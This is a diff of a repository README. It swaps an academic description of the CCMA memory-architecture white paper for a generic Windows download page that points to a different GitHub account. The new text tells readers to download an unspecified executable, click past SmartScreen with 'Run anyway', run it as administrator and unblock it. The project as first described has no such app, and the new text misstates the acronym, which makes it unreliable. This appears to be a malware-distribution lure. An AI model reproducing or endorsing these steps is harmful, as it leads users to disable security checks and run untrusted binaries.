@@ -1,67 +1,159 @@
-# CCMA: Conversational Context Management Algorithm
+# 🧠 ccma-edge-architecture - Keep context clear and persistent
 
-> **Architecting Cognitive Persistence: Integrating CCMA with 768-Dimensional Hyperbolic Manifolds for Centroid-Preserving Memory**
+[![Download on GitHub](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/gonzaloaquiferous551/ccma-edge-architecture)
 
-> **Patent Pending** - U.S. Provisional Application No. 64/006,354 (Filed: March 15, 2026)
+## 📥 Download
+Use this link to visit the page and download the app:
 
-This repository contains the white paper and architectural specifications for the **Conversational Context Management Algorithm (CCMA)**. CCMA is a deterministic framework designed to solve the $\mathcal{O}(n^2)$ attention bottleneck and catastrophic forgetting in long-horizon edge LLM interactions by bridging localized context caches with deeply hierarchical, hyperbolic lifelong memory.
+https://github.com/gonzaloaquiferous551/ccma-edge-architecture
 
-## 🧠 Architectural Philosophy (The Universal Coding Manifesto)
+## 🪟 Windows Setup
+This app is made for Windows users who want to run it on a local machine.
 
-CCMA adheres strictly to a **Functional Core / Imperative Shell** architecture, enforcing a zero-trust environment:
+1. Open the download link above.
+2. On the GitHub page, look for the latest release or the main download file.
+3. Download the Windows file to your computer.
+4. If the file is in a .zip folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, choose Yes.
+8. If SmartScreen appears, select More info, then Run anyway.
 
-* **Functional Core (Deterministic):** Silicon-enforced mathematical gating, semantic-temporal decay calculations, hyperbolic metric tracking, and Trust No One (TNO) circuit breakers are implemented as pure, immutable functions.
+## 🔧 What this app does
+CCMA stands for Synoptic Context Management. It helps an AI system keep track of useful information over time.
 
-* **Imperative Shell (Probabilistic):** Manages volatile generative state (the LLM/TPU), relying purely on the geometrically stable vectors fed to it by the Core. The LLM physically cannot hallucinate its own geometric memory coordinates.
+This app is built for:
+- long-running memory
+- clean context management
+- graph-based data links
+- bi-temporal records
+- stable context compaction
+- edge compute use
 
-## 🚀 Key Innovations
+In simple terms, it helps the system remember what matters, even when the session grows large.
 
-* **The Poincaré Ball Paradigm:** Transitions lifelong memory from flat Euclidean space to a 768-dimensional hyperbolic manifold, allowing exponential graph embedding without structural distortion.
+## ✨ Main features
+- Keeps context organized
+- Stores short-term and long-term memory
+- Uses graph links to connect related data
+- Tracks time in two ways for better history control
+- Supports edge-based AI use
+- Helps reduce context loss
+- Works with semantic memory
+- Fits workflows that need repeatable results
 
-* **Colliding Weights & Centroid Collapse Mitigation:** A deterministic hardware trigger that detects semantic crowding ($\Phi_{\text{total}} > \tau_{\text{collapse}}$) and executes Tangent Space Max-Pooling to mathematically preserve distinct semantic peaks.
+## 🖥️ System needs
+For a smooth run on Windows, use a computer with:
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space
+- A recent Intel or AMD CPU
+- Internet access for first-time download and setup
 
-* **Biological Sleep Cycle Memory Consolidation:** Mathematically maps Wake (Euclidean L1), NREM (Cartesian pooling), and REM (Generative Replay/Hyperbolic Projection) phases for asynchronous memory stabilization.
+For better performance:
+- 16 GB RAM
+- SSD storage
+- A GPU if your build supports it
 
-* **Topological Isomorphism (Gabriel's Horn):** Resolves the finite compute / infinite memory paradox by treating localized VRAM (Context Window) as the finite *volume* and the Hyperbolic Archival tier as the infinite *surface area*.
+## 📦 Files you may see
+After download, you may see files like:
+- .exe
+- .zip
+- README.md
+- config files
+- data folders
 
-* **TNO Circuit Breaker:** Neutralizes Adversarial REM-Forcing (Compute Exhaustion DoS attacks) by evaluating payloads using Topological Entropy Scoring ($H_{\text{topo}}$) before authorizing hardware interrupts.
+If you see a .zip file, extract it before opening the app.
 
-## 🛠 Silicon-Level Isomorphism (Hardware Spec)
+## 🧭 First run
+1. Open the app folder.
+2. Start the main Windows file.
+3. Wait for the program to load.
+4. Follow any on-screen setup steps.
+5. If the app asks for a data path, choose a folder you can find later.
+6. If it asks for a workspace name, use any short name you want.
+7. Save your settings.
 
-The framework theorizes an integrated **FPGA/TPU Hybrid System-on-Chip**:
+## 🗂️ How to use it
+This app is built to help manage memory across long sessions.
 
-1. **FPGA (The Core):** Maintains geometric state monitoring, continuously calculating inverse hyperbolic cosines and collision densities in bounded clock cycles.
+Typical use:
+1. Add new context or notes.
+2. Let the app organize the data.
+3. Link related items together.
+4. Reuse stored context later.
+5. Keep the same workspace for continued sessions.
 
-2. **TPU (The Shell):** Handles generative inference and natural language processing, maintained in a low-power "Dark Silicon" state until invoked by the FPGA's validated memory payloads.
+If you use this with an AI workflow, the app can help keep records neat and easier to reuse.
 
-## 📄 Abstract
+## 🔍 Common terms
+- Context: the useful information the system needs to remember
+- Memory: saved information from past use
+- Graph: a set of linked items
+- Bi-temporal: time tracked in two ways, such as when data happened and when it was stored
+- Semantic memory: memory based on meaning, not just raw text
+- Edge compute: running tasks on a local device instead of a remote server
 
-The deployment of long-horizon conversational agents in resource-constrained computing environments is bottlenecked by the quadratic scaling of transformer self-attention and the catastrophic forgetting inherent to standard First-In-First-Out (FIFO) caches. This paper integrates the Conversational Context Management Algorithm (CCMA) with a 768-dimensional Poincaré ball model of hyperbolic geometry to establish a structurally flawless bridge between high-speed localized caches and deeply hierarchical lifelong memory. Operating on a strict Functional Core / Imperative Shell architecture, we define a Semantic-Temporal Modulator to correct Ebbinghaus decay, and mathematically formalize the threat of "Centroid Collapse" in standard Euclidean vector aggregation. By synthesizing a deterministic "Colliding Weights" trigger, Tangent Space Max-Pooling sequences, Riemannian Repulsion, and TNO Circuit Breakers executed on FPGA/TPU hybrid silicon, this framework ensures that high-entropy semantic peaks are preserved in perpetuity.
+## 🛠️ Basic troubleshooting
+If the app does not start:
+1. Right-click the file and choose Run as administrator.
+2. Check that the file finished downloading.
+3. Make sure you extracted the zip folder.
+4. Restart your computer.
+5. Try opening the app again.
 
-## 📦 PDF Availability
+If Windows blocks the app:
+1. Open the file properties.
+2. Check Unblock, if you see it.
+3. Apply the change.
+4. Run the app again.
 
-The full academic whitepaper PDF is produced automatically via GitHub Actions:
+If the app opens but does not load data:
+1. Check that the data folder still exists.
+2. Make sure you have write access to that folder.
+3. Try a new empty folder.
+4. Reload the workspace
 
-* **Workflow Artifact:** Generated on each successful compile run of the `.tex` source.
+## 📁 Suggested workflow
+A simple way to use this app:
+- create one workspace per project
+- keep related notes in one place
+- use clear item names
+- store repeatable context first
+- review old entries before adding new ones
+- keep backups of your data folder
 
-* **GitHub Pages:** Publishes a stable `latest.pdf` on the default trunk branch.
+## 🔐 Data handling
+This app is built for local use on an edge device. That means your data can stay on your computer instead of moving to a remote system.
 
-* **GitHub Releases:** Tagged SemVer releases (e.g., `v1.2.0`) include the PDF as a downloadable release asset.
+Good habits:
+- keep a backup copy of your workspace
+- use a folder you can find again
+- avoid deleting files while the app is open
+- close the app before moving folders
 
-## 🔗 Repository Structure
+## 🧩 Project focus
+This repository centers on:
+- agentic AI workflows
+- memory management
+- graph RAG
+- semantic memory
+- bi-temporal data
+- hyperbolic geometry
+- functional programming
+- FPGA-aware edge use
 
-* `CCMA_Hyperbolic_Memory.tex`: Source manuscript (LuaLaTeX).
+The main goal is to keep context stable and easy to reuse over time
 
-* `.github/workflows/render-tex-to-pdf.yml`: Automated PDF build and publication workflow.
+## 📌 Useful tips
+- Use a short workspace name
+- Keep one folder per project
+- Back up your data often
+- Keep file names simple
+- Do not move folders while the app is running
+- Use the same device for the same workspace when possible
 
-* `README.md`: Project overview and publication details.
+## 📎 Download again
+If you need to return to the download page, use this link:
 
-* `LICENSE`: Apache License 2.0.
-
-**Author:** Dane Robert Jones
-
-*Software Engineering Student, Western Governors University*
-
-*Technical SME, Essintial*
-
-[danerjones@gmail.com](mailto:danerjones@gmail.com) | [ORCID 0009-0003-8014-7298](https://orcid.org/0009-0003-8014-7298)
+https://github.com/gonzaloaquiferous551/ccma-edge-architecture
